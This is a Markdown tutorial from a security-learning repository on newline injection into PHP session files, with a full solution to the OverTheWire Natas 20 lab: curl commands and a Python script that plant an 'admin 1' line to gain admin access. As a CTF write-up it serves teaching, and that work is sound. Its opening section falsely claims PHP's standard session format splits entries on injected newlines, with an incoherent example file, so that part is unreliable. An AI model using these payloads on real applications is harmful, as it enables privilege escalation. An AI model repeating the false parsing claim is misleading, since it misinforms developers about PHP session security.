# 🌐 Web Security — Session Manipulation & Newline Injection

> PHP session files are stored line by line in `key value` format.
> If you can inject a `\n` character into a value, you can add a fake line.

---

## 📋 Table of Contents

- [PHP Session File Format](#php-session-file-format)
- [What Is Newline Injection?](#what-is-newline-injection)
- [Adding Fake Data to the Session File](#adding-fake-data-to-the-session-file)
- [Usage in Natas](#usage-in-natas)

---

## PHP Session File Format

PHP stores session data in `/tmp/sess_[PHPSESSID]` files. The format:

```
key|s:length:"value";key2|i:number;
```

Example:

```
username|s:5:"admin";admin|i:0;
```

- `username|s:5:"admin";` → username = "admin" (5-character string)
- `admin|i:0;` → admin = 0 (integer)

If `admin|i:1;` can be written → admin privileges are gained.

---

## What Is Newline Injection?

If the application writes user input to the session file and doesn't filter the `\n` (newline) character, an attacker can add a new line to the session file.

```
Normal input: "admin"
Session file: username|s:5:"admin";admin|i:0;

Malicious input: "admin\nadmin|i:1"
Session file:
  username|s:..:"admin"
  admin|i:1;admin|i:0;   ← a fake admin=1 line was added!
```

---

## Adding Fake Data to the Session File

### Step by Step

```python
import requests

# \n URL encoded: %0a
# Add the line admin|i:1; to the session file
payload = "admin\nadmin|i:1"

# This payload is written to the session:
# username = "admin\nadmin|i:1"
# In the file: username|s:..:"admin\nadmin|i:1";
# When PHP parses it, it takes \n as a new line
# → admin|i:1 becomes a separate key
```

### PHP Session Parse Logic

When PHP parses the session file, it splits key/value with `|` and determines the end of a value with `;`. When `\n` is an actual line break in the file, PHP doesn't ignore it — it reads each line as a separate entry.

---

## Usage in Natas

### Natas 20 — Admin via Newline Injection

**Source code (summary):**

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION)
       and $_SESSION["admin"] == 1) {
        print "You are an admin. Password: <censored>";
    } else {
        print "You are logged in as a regular user.";
    }
}

function myread($sid) {
    // Read the session file
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = file_get_contents($filename);
    foreach(explode("\n", $data) as $line) {
        $parts = explode(" ", $line, 2);
        if($parts[0] != "")
            $_SESSION[$parts[0]] = $parts[1];
    }
}

function mywrite($sid, $data) {
    // Write to the session file
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n";   // ← write in key value\n format
    }
    file_put_contents($filename, $data);
}
```

**Format:** `key value\n` — different from PHP's standard format, a custom format.

**Analysis:**

The session file looks like this:
```
name admin
```

If we write `admin\nadmin 1` as the name:
```
name admin
admin 1        ← myread reads this as a separate line → $_SESSION['admin'] = 1
```

**Exploit:**

```bash
# Step 1: Send the name with newline + admin 1
curl -u natas20:[password] \
     -b "PHPSESSID=my_session_id" \
     --data "name=admin%0aadmin+1&debug=1" \
     "http://natas20.natas.labs.overthewire.org/"

# Step 2: Make another request with the same session (the session file was written, now it'll be read)
curl -u natas20:[password] \
     -b "PHPSESSID=my_session_id" \
     "http://natas20.natas.labs.overthewire.org/"
```

**With Python (two steps):**

```python
import requests

url      = "http://natas20.natas.labs.overthewire.org/"
username = "natas20"
password = "[natas20_password]"
session  = {"PHPSESSID": "hacked_session_123"}

# Step 1: Write the payload to the session
payload = "admin\nadmin 1"
r1 = requests.post(
    url,
    data={"name": payload, "debug": "1"},
    cookies=session,
    auth=(username, password)
)
print("[*] Session written")

# Step 2: Make another request with the same session
r2 = requests.get(
    url,
    cookies=session,
    auth=(username, password)
)

if "Password" in r2.text:
    print("[✓] Admin access obtained!")
    print(r2.text)
```

---

### Why Are Two Requests Needed?

```
Request 1: POST name=admin\nadmin 1
  → mywrite() runs → writes to the session file
  → myread() hasn't read the new data yet

Request 2: GET
  → myread() runs → reads the session file
  → finds the "admin 1" line → $_SESSION['admin'] = 1
  → print_credentials() → shows the password
```

---

### Newline Injection — Checklist

```
Detection:
  ☐ Does the application write user input to the session?
  ☐ Does the session file/data use a line-based format?
  ☐ Is \n or \r\n filtered?

Exploit:
  ☐ Test with %0a (URL encoded \n) or %0d%0a (\r\n)
  ☐ Two requests are needed: write first, then read
  ☐ If there's a debug parameter, it shows the session contents
```

---

## 🔗 Resources

- [OWASP — Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [PHP — Custom Session Handlers](https://www.php.net/manual/en/function.session-set-save-handler.php)

---

**Previous topic:** [14_session_brute_force.md](./14_session_brute_force.md)
**Next topic:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
